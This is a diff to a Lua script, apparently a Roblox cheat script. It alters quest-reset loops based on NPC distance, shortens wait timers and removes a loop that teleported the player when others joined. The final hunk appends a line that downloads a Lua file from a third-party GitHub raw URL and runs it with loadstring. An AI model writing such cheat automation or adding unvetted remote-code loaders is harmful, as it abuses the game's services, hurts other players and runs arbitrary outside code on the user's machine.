@@ -468,22 +468,16 @@ end)
 
 task.spawn(function()
     while true do
-        pcall(function()
-            if data.Quest.Value ~= "" then
-                task.wait(1)
-                local npcFolder = game:GetService("Workspace").Others.NPCs
-                for _, npc in ipairs(npcFolder:GetChildren()) do
-                    if npc:FindFirstChild("HumanoidRootPart") then
-                        local distance = (npc.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).Magnitude
-                        if distance <= 500 and npc.Name ~= "Halloween NPC" then
-                            data.Quest.Value = ""
-                            break
-                        end
-                    end
+        if data.Quest.Value ~= "" then
+            wait(1)
+            for _, npc in ipairs(game.Workspace.Others.NPCs:GetChildren()) do
+                if npc:FindFirstChild("HumanoidRootPart") and (npc.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).Magnitude <= 500 and npc.Name ~= "Halloween NPC" then
+                    data.Quest.Value = ""
+                    break
                 end
             end
-        end)
-        task.wait(1)
+        end
+        wait()
     end
 end)
 
@@ -679,26 +673,10 @@ task.spawn(function()
                 end
             end
         end)
-        wait(3)
+        task.wait()
     end
 end)
 
-
-spawn(function()
-    while true do
-        pcall(function()
-            local playerCount = #game.Players:GetPlayers()
-            if playerCount > 1 then
-                if game.PlaceId == 5151400895 then
-                    game.ReplicatedStorage.Package.Events.TP:InvokeServer("Vills Planet")
-                else
-                    game.ReplicatedStorage.Package.Events.TP:InvokeServer("Earth")
-                end
-            end
-        end)
-        wait(5)
-    end
-end)
 
 local lplr = game.Players.LocalPlayer
 local ldata = game.ReplicatedStorage:WaitForChild("Datas"):WaitForChild(lplr.UserId)
@@ -810,6 +788,7 @@ task.spawn(function()
         wait()
     end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Koala743/Koala7/refs/heads/main/Main2.lua'))()
 
 end
 
